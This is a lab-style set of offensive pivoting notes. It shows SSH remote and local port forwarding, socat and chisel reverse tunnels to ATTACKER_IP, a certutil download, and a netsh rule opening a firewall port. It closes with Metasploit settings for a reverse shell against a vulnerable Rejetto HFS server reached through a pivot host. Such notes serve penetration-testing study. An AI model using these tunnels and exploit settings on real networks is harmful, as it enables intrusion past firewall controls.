import Tabs from '@theme/Tabs';
import TabItem from '@theme/TabItem';


### SSH Remote Port Forwarding

Useful when **`Firewall`** Policies block the Attacker's Machine from directly accessing Port **3389** on the Server. If the Attacker has previously compromised **PC-1** and, in turn, **PC-1** has access to port **3389** of the server, it can be used to Pivot to Port **3389** using **Remote Port Forwarding** from **PC-1.**

**Remote Port Forwarding** allows to take a reachable Port from the **SSH Client [PC-1]** and Project it into a **Remote SSH Server [Attacker]**.

<br/>


With this method a Port will be opened in the Attacker Machine that can be used to connect back to Port **3389** in the Server through the SSH Tunnel. **PC-1** will, in turn, **Proxy** the Connection so that the Server will see all the Traffic as if it was coming from **PC-1.**

```batch
:: -R [Request Remote Port Forward]
ssh user@1.1.1.1 -R 3389:3.3.3.3:3389 -N
```

```batch
:: Accessing the Port from the Attacker Machine
xfreerdp /v:127.0.0.1 /u:username /p:password /port:3389
```

<br/>

### SSH Local Port Forwarding

**Local Port Forwarding** allows to Pull a Port from an SSH Server into the SSH Client. This could be used to take any Service available in an Attacker Machine and make it available through a port on **PC-1.** 

This way, any Host that can't connect directly to the **Attacker PC** but can connect to **PC-1** will now be able to reach the Attacker Services through the **Pivot Host.**


```batch
:: -L [Request Local Port Forward]
ssh tunneluser@1.1.1.1 -L "*:80:127.0.0.1:80" -N
```

```batch
:: Hosting a Server on the Attacker Machine
python3 -m http.server 7000

:: The Server is accessible on the Victim Machine
certutil -urlcache -split -f "http://127.0.0.1:7000/test.md"
```

<br/>

:::danger Requires Administrative Privileges

:::


Since we are Opening a new Port on **PC-1**, we might need to add a **Firewall Rule** to Allow for Incoming Connections.

```batch
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```

<br/>

### SOCAT

One of the Disadvantages of using **`socat`** is that we need to **Transfer** it to the Pivot Host **PC-1**, making it more detectable than **SSH.**


```batch
:: Forwarding Filtered Port [3389]
socat TCP4-LISTEN:7777,fork TCP4:VICTIM_IP:3389
```

```batch
:: If the Port [3389] was Filtered now it would be Accessible
xfreerdp /v:10.200.71.249 /u:username /p:password /port:7777
```

<br/>

### CHISEL

**`Chisel`** is a fast **TCP/UDP** Tunnel, transported over **HTTP**, secured via SSH. Chisel is mainly useful for passing through **`Firewalls`**.

<Tabs>
  <TabItem value="chisel_one" label="Attacker"> 
    <div style={{color: 'red'}}>

```batch
:: Listens for Connections
chisel server --reverse --port 8000
```

</div>
  </TabItem>
  <TabItem value="chisel_two" label="Victim">
    <div style={{color: 'red'}}>

```batch
:: Connects back to the Attacker Listener
chisel client ATTACKER_IP:8000 R:7777:127.0.0.1:3389
```

</div>
  </TabItem>
</Tabs>


<br/>

```batch
:: Accessing the Port from the Attacker Machine
:: The Victim [RDP: 3389] is now Accessible at [PORT: 7777] on the Attacker Machine
xfreerdp /v:127.0.0.1 /u:username /p:password /port:7777
```

<br/>

## Rejetto [Behind Firewall]

The **`Rejetto Server`** Server is running a Vulnerable version of **Rejetto HFS.** The problem we face is that **Firewall** rules Restrict access to the Vulnerable Port so that it can only be viewed from **`Windows Machine`**. 

```mermaid
flowchart RL

A(((10.200.71.101 <br> Rejetto Server)))

B(10.200.71.249 <br> Windows Machine) -. "9999 🠔 80" .-> C(Attacker)


C -. "80" .-x A

A -. "80" .-> B

B -. "80" .-> A
```



<br/>

```batch
ssh tunneluser@10.50.65.82 -R 9999:10.200.71.101:80 -L *:6969:127.0.0.1:6969 -L *:8989:127.0.0.1:8989 -N
               └─────────┘    └───────────────────┘    └───────────────────┘    └───────────────────┘
                    |                   |                        |                        |
                    |                   |                        |                        |
                    |                   |                        |                        └────► 4.  Bind Port [8989] To Victim Machine
                    |                   |                        └────► 3. Bind Port [6969] To Victim Machine
                    |                   └────► 2. Rejetto Server IP
                    |                             [Forwarding Port :9999 🠔 80]
                    └───► 1. Attacker IP
```


### Exploit Path

**Rejetto HFS** will be listening on **Port 80** on **`Rejetto Server`**, so we need to Tunnel that port back to the Attacker Machine through **`Windows Machine`.** The Port for the Values **SRVPORT - LPORT** can be set to a Random Number.


<br/>

```batch
:: Send Reverse Shell to Attacker
set LHOST 10.200.71.249
set LPORT 8989

:: Request PAYLOAD via HTTP
set SRVPORT 6969
set SRVHOST 127.0.0.1

:: Trigger Exploit
set RPORT 9999
set RHOSTS 127.0.0.1

:: We want the Reverse Shell Listener to be Bound to [127.0.0.1] on the Attacker Machine and the PAYLOAD to connect back to [Windows Machine]
set ReverseListenerBindAddress 127.0.0.1
```